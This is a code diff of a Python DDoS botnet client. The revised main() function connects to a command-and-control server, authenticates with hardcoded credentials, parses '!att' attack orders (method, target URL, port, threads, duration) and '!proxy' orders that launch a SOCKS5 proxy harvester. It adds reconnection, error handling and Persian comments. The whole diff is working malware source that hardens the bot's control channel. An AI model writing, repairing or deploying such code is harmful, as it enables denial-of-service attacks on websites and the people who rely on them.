@@ -202,40 +202,83 @@ def wait_for_selector_visible(driver, selector, timeout):
     )
 
 def main():
-    s = socket(AF_INET , SOCK_STREAM)
-    while 1:
-        try:
-            s.connect((ipc2 , portc2))
-            print('vpn connected')
-            sleep(0.5)
-            while 1:
-                data = s.recv(1024).decode()
-                if "Username" in data:
-                    s.send("kediam".encode())
-                    break
-            while 1:
-                data = s.recv(1024).decode()
-                if "Password" in data:
-                    s.send("FSOCIETY".encode())
-                    break
-            break
-        except:
-            sleep(5)
     while True:
+        s = None
         try:
-            c2 = s.recv(1024).decode().strip()
-            if c2.split()[0] == '!att':
-                method = str(c2.split()[1])
-                url = str(c2.split()[2])
-                port = int(c2.split()[3])
-                threads = int(c2.split()[4])
-                rpc = int(c2.split()[5])
-                timme = int(c2.split()[6])
-                timer = time() + timme
-            elif c2.split()[0] == '!proxy':
-                thr(target=socks5geter).start()
-        except:
-            pass
+            s = socket(AF_INET, SOCK_STREAM)
+            print("Trying to connect...")
+            s.connect((ip, port))
+            print("Connected to server.")
+
+            # فرآیند احراز هویت
+            while True:
+                try:
+                    data = s.recv(1024).decode(errors="ignore")
+                    if "Username" in data:
+                        s.send("kediam".encode())
+                        print("Username sent.")
+                        break
+                except Exception as e:
+                    print(f"Error during username exchange: {e}")
+                    s.close()
+                    sleep(1)
+                    return
+
+            while True:
+                try:
+                    data = s.recv(1024).decode(errors="ignore")
+                    if "Password" in data:
+                        s.send("FSOCIETY".encode())
+                        print("Password sent.")
+                        break
+                except Exception as e:
+                    print(f"Error during password exchange: {e}")
+                    s.close()
+                    sleep(1)
+                    return
+
+            # دریافت دستورات
+            while True:
+                try:
+                    c2 = s.recv(1024).decode(errors="ignore").strip()
+                    if not c2:
+                        raise ConnectionResetError("Server closed the connection.")
+                    print(f"Command received: {c2}")
+
+                    if c2.startswith('!att'):
+                        parts = c2.split()
+                        if len(parts) >= 7:
+                            method = parts[1]
+                            url = parts[2]
+                            port = int(parts[3])
+                            threads = int(parts[4])
+                            rpc = int(parts[5])
+                            timme = int(parts[6])
+                            timer = time() + timme
+                            print(f"Attack Command:\nMethod: {method}, URL: {url}, Port: {port}, Threads: {threads}, RPC: {rpc}, Time: {timme}")
+                        else:
+                            print("Invalid !att command format.")
+
+                    elif c2.startswith('!proxy'):
+                        print("Starting proxy retrieval...")
+                        thr(target=socks5geter).start()
+
+                except ConnectionResetError as e:
+                    print(f"Connection lost: {e}")
+                    break
+                except Exception as e:
+                    print(f"Error processing command: {e}")
+
+        except Exception as e:
+            print(f"Connection error: {e}")
+        finally:
+            if s:
+                try:
+                    s.close()
+                except Exception as e:
+                    print(f"Error closing socket: {e}")
+            print("Reconnecting in 5 seconds...")
+            sleep(5)
 
         try:
             us = UserAgent()
